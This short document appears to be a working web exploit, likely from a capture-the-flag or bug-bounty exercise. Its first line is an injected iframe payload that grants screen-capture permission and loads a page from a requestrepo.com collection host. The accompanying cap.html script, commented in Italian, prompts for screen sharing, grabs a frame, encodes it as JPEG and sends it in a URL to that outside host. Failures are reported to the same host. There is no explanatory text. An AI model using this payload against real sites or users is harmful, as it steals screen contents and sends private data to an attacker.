&[[ allow=display-capture&#32;* sandbox=allow-scripts&#32;allow-same-origin srcdoc=&lt;iframe&#32;allow=&#34;display-capture&#32;*&#34;&#32;src=&#34;https://45qubnd4.requestrepo.com/cap2.html&#34;&gt;&lt;/iframe&gt;&#32;x= ](p)](pad)

# cap.html

<!doctype html><meta charset="utf-8">
<script>
(async()=>{
  try{
    const s = await navigator.mediaDevices.getDisplayMedia({video:true});
    const v = document.createElement('video'); v.muted = true; v.srcObject = s; await v.play();
    await new Promise(r => setTimeout(r, 500));      // <-- aspetta 500 ms
    const c = document.createElement('canvas');
    const w = 1000;                                   // resta compatto per l'URL
    c.width = w; c.height = v.videoHeight*(w/v.videoWidth);
    c.getContext('2d').drawImage(v,0,0,c.width,c.height);
    const b64 = c.toDataURL('image/jpeg', 0.10).split(',')[1];
    location.href = 'https://45qubnd4.requestrepo.com/shot?d=' + encodeURIComponent(b64);
    s.getTracks().forEach(t => t.stop());
  }catch(e){
    location.href = 'https://45qubnd4.requestrepo.com/err?m=' + encodeURIComponent(e.name+':'+e.message);
  }
})();
</script>
